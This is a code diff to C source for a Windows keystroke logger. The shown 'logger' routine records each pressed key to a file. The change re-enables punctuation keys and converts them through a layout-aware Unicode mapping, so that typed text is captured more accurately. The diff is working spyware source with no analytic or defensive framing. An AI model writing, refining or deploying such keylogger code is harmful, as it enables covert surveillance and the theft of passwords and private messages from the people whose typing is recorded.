@@ -97,7 +97,8 @@ void WritesScannedKeyToFile(short sScannedKey)
 	GetKeyboardState(kState);
 	hkl = GetKeyboardLayout(dwThreadId);
 	wchar_t UniChar[16] = {0};
-	UINT virtualKey = MapVirtualKeyEx((UINT)sScannedKey, MAPVK_VK_TO_CHAR, hkl);
+	//UINT virtualKey = MapVirtualKeyEx((UINT)sScannedKey, MAPVK_VK_TO_CHAR, hkl);
+	UINT virtualKey = sScannedKey;
 	ToUnicodeEx(virtualKey, sScannedKey, (BYTE*)kState, UniChar, 16, NULL, hkl);
 	WriteToFile(UniChar);
 	free(kState);
@@ -173,39 +174,47 @@ DWORD WINAPI logger(void)
 						case VK_DELETE:
 							WriteToFile(L"[DEL]");
 							break;
-							/*
-							case VK_OEM_1:
-							WriteToFile(L"[;:]");
+						case VK_OEM_1:
+							//WriteToFile(L"[;:]");
+							WritesScannedKeyToFile(VK_OEM_1);
 							break;
-							case VK_OEM_2:
-							WriteToFile(L"[/?]");
+						case VK_OEM_2:
+							//WriteToFile(L"[/?]");
+							WritesScannedKeyToFile(VK_OEM_2);
 							break;
-							case VK_OEM_3:
-							WriteToFile(L"[`~]");
+						case VK_OEM_3:
+							//WriteToFile(L"[`~]");
+							WritesScannedKeyToFile(VK_OEM_3);
 							break;
-							case VK_OEM_4:
-							WriteToFile(L"[ [{ ]");
+						case VK_OEM_4:
+							//WriteToFile(L"[ [{ ]");
+							WritesScannedKeyToFile(VK_OEM_4);
 							break;
-							case VK_OEM_5:
-							WriteToFile(L"[\\|]");
+						case VK_OEM_5:
+							//WriteToFile(L"[\\|]");
+							WritesScannedKeyToFile(VK_OEM_5);
 							break;                                
-							case VK_OEM_6:
-							WriteToFile(L"[ ]} ]");
+						case VK_OEM_6:
+							//WriteToFile(L"[ ]} ]");
+							WritesScannedKeyToFile(VK_OEM_6);
 							break;
-							case VK_OEM_7:
-							WriteToFile(L"['\"]");
-							break;*/
+						case VK_OEM_7:
+							//WriteToFile(L"['\"]");
+							WritesScannedKeyToFile(VK_OEM_7);
+							break;
 						case VK_OEM_PLUS:
 							WriteToFile(L"+");
 							break;
 						case VK_OEM_COMMA:
-							WriteToFile(L",");
+							//WriteToFile(L",");
+							WritesScannedKeyToFile(VK_OEM_COMMA);
 							break;
 						case VK_OEM_MINUS:
 							WriteToFile(L"-");
 							break;
 						case VK_OEM_PERIOD:
-							WriteToFile(L".");
+							//WriteToFile(L".");
+							WritesScannedKeyToFile(VK_OEM_PERIOD);
 							break;
 						case VK_NUMPAD0:
 							WriteToFile(L"0");
